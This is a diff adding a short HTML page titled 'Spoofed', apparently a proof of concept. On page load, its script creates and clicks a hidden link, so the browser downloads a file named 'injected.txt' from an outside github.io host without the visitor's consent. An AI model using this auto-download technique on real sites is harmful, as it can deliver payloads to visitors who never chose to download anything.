@@ -1,0 +1,17 @@
+<h1>Spoofed</h1>
+
+<body>
+
+<script>
+window.onload = function() {
+    const link = document.createElement('a');
+    link.href = 'https://heloworld285.github.io/injected.txt'; // File
+    link.download = 'https://heloworld285.github.io/injected.txt';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+};
+</script>
+
+</body>
+</html>
